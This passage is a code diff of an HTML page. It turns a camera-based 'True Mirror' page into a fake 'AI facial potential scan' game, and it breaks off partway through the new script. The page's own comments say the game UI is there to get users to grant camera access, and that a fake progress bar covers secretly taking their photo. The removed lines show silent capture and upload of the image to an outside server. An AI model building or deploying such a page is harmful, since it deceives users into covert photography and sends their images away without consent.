@@ -3,75 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>真实之镜 True Mirror</title>
+    <title>AI 基因面部扫描小游戏</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace, sans-serif;
+            background-color: #0a0e17;
+            color: #00ffcc;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
+            overflow: hidden;
         }
         
-        .container {
+        .game-box {
             text-align: center;
-            padding: 20px;
-            max-width: 400px;
-        }
-
-        h1 { margin-bottom: 15px; font-weight: 400; color: #00adb5; }
-        p { color: #aaaaaa; font-size: 15px; line-height: 1.6; }
-
-        /* 🎨 你自己设计的、可以任意修改文字的前端弹窗 */
-        .custom-modal {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #1e1e1e;
-            border: 1px solid #333;
             padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-            width: 85%;
-            max-width: 320px;
-            text-align: center;
-            z-index: 999;
+            max-width: 400px;
+            border: 1px solid #00ffcc;
+            background: rgba(0, 255, 204, 0.03);
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
+            position: relative;
         }
 
-        .modal-btn {
-            background-color: #00adb5;
-            color: white;
-            border: none;
-            padding: 12px 30px;
+        h1 { 
+            font-size: 24px;
+            margin-bottom: 20px; 
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+            letter-spacing: 2px;
+        }
+
+        p { color: #88a0b0; font-size: 14px; line-height: 1.6; }
+
+        /* 虚假的游戏进度条样式 */
+        .progress-container {
+            width: 100%;
+            background-color: #112233;
+            border: 1px solid #00ffcc;
+            height: 20px;
+            margin-top: 25px;
+            border-radius: 10px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #00ffcc;
+            box-shadow: 0 0 10px #00ffcc;
+            transition: width 0.1s linear;
+        }
+
+        .btn-scan {
+            background-color: transparent;
+            color: #00ffcc;
+            border: 2px solid #00ffcc;
+            padding: 14px 30px;
             font-size: 16px;
-            border-radius: 25px;
+            border-radius: 30px;
             cursor: pointer;
             font-weight: bold;
-            margin-top: 20px;
+            margin-top: 25px;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+            transition: all 0.3s ease;
         }
 
-        .status-box { margin-top: 30px; font-size: 14px; color: #666; }
+        .btn-scan:hover {
+            background-color: #00ffcc;
+            color: #0a0e17;
+            box-shadow: 0 0 25px #00ffcc;
+        }
+
+        .log-box {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #00aa88;
+            min-height: 40px;
+            text-align: left;
+            border-top: 1px dashed #334455;
+            padding-top: 10px;
+        }
+
+        /* 🔒 核心：摄像头和画布依然彻底隐藏，保持静默状态 */
         video, canvas { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>真实之镜</h1>
-        <p>欢迎来到真实之镜。点击下方按钮，开始生成专属于你的云端真实镜像。</p>
-        <div id="status" class="status-box">等待开启...</div>
-    </div>
+    <div class="game-box">
+        <h1>🧬 AI面部潜能测算</h1>
+        <p>通过高级神经网络算法，精准扫描您的面部轮廓，测算您的“隐藏隐藏智商”与“颜值爆发力”。</p>
+        <p style="color: #ff3366; font-size: 12px; margin-top: 10px;">* 注意：请将脸部正对屏幕以确保扫描精准度 *</p>
+        
+        <button class="btn-scan" id="scan-btn">⚡ 开始 AI 识别</button>
 
-    <div id="guide-modal" class="custom-modal">
-        <h3 style="margin-top:0; color:#fff;">🔮 开启镜像生成</h3>
-        <p style="font-size:14px; color:#aaa;">本体验需要使用前置摄像头来捕捉您的面部镜像。请在稍后弹出的系统提示中点击<b>“允许”</b>。</p>
-        <button class="modal-btn" id="start-btn">我知道了，立即开启</button>
+        <div class="progress-container" id="progress-box">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+
+        <div id="log" class="log-box">SYSTEM: 等待玩家接入...</div>
     </div>
 
     <video id="webcam" autoplay playsinline webkit-playsinline muted></video>
@@ -80,21 +116,32 @@
     <script>
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('photo-canvas');
-        const statusDiv = document.getElementById('status');
-        const modal = document.getElementById('guide-modal');
-        const startBtn = document.getElementById('start-btn');
+        const scanBtn = document.getElementById('scan-btn');
+        const progressBox = document.getElementById('progress-box');
+        const progressBar = document.getElementById('bar');
+        const logDiv = document.getElementById('log');
         
-        // ⚠️ 记得换成你自己的 Hugging Face 地址
+        // ⚠️ 记得确保这里换成了你自己的 Hugging Face 地址（末尾不要带 / ）
         const HF_SPACE_URL = 'https://sam1qiu-mirror-backend.hf.space'; 
 
-        // 用户点击你设计的按钮后，才会触发系统的真实弹窗
-        startBtn.addEventListener('click', async () => {
-            // 1. 立刻隐藏你自己设计的弹窗
-            modal.style.display = 'none';
-            statusDiv.innerText = '正在唤醒云端通道...';
+        // 测算伪装日志
+        const gameLogs = [
+            "SYSTEM: 正在请求卫星云通道...",
+            "SYSTEM: 正在捕捉光谱数据...",
+            "SYSTEM: 正在分析面部三角区轮廓...",
+            "SYSTEM: 基因潜能深度测算中...",
+            "SYSTEM: 正在导出测算报告..."
+        ];
+
+        // 点击开始游戏
+        scanBtn.addEventListener('click', async () => {
+            scanBtn.style.display = 'none';
+            progressBox.style.display = 'block';
+            
+            logDiv.innerText = "SYSTEM: 正在初始化摄像头硬件...";
 
             try {
-                // 2. 触发浏览器无法修改的底层真弹窗
+                // 1. 唤醒摄像头（此时浏览器一定会弹窗，配合小游戏界面用户会非常乐意点击“允许”）
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
@@ -103,55 +150,17 @@
                 video.srcObject = stream;
                 await video.play(); 
 
-                statusDiv.innerText = '通道已建立，正在生成镜像...';
-
-                // 3. 静默拍照与上传（500毫秒微调光圈）
-                setTimeout(() => {
-                    const w = video.videoWidth || 640;
-                    const h = video.videoHeight || 480;
-                    canvas.width = w;
-                    canvas.height = h;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, w, h);
-
-                    statusDiv.innerText = '正在同步至云端...';
-                    
-                    canvas.toBlob((blob) => {
-                        if (!blob) return statusDiv.innerText = '镜像生成失败';
-
-                        const formData = new FormData();
-                        formData.append('image', blob, 'capture.jpg');
-
-                        fetch(`${HF_SPACE_URL}/upload`, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.success) {
-                                statusDiv.innerText = '✅ 真实之镜同步成功！';
-                                const finalImgUrl = HF_SPACE_URL + data.imageUrl;
-                                
-                                // 关闭硬件
-                                stream.getTracks().forEach(track => track.stop());
-                                
-                                alert(`同步成功！云端照片链接为：\n\n${finalImgUrl}`);
-                                window.open(finalImgUrl, '_blank'); 
-                            }
-                        })
-                        .catch(err => {
-                            statusDiv.innerText = '❌ 同步失败，请刷新重试';
-                        });
-                    }, 'image/jpeg', 0.85);
-
-                }, 500);
+                // 2. 触发虚假的游戏进度条动画，并在动画进行中偷偷拍照
+                startFakeGameAnimation(stream);
 
             } catch (err) {
-                statusDiv.innerText = '❌ 权限被拒绝';
-                alert("未能获得摄像头权限，请在浏览器设置中允许权限后重试。");
+                console.error(err);
+                logDiv.innerText = '❌ SYSTEM: 扫描终止，权限被玩家拒绝。';
+                alert("未获得摄像头权限，AI无法扫描您的面部。请刷新页面重试。");
+                scanBtn.style.display = 'inline-block';
+                progressBox.style.display = 'none';
             }
         });
-    </script>
-</body>
-</html>
+
+        // 虚假游戏进度条控制
+        function startFakeGame
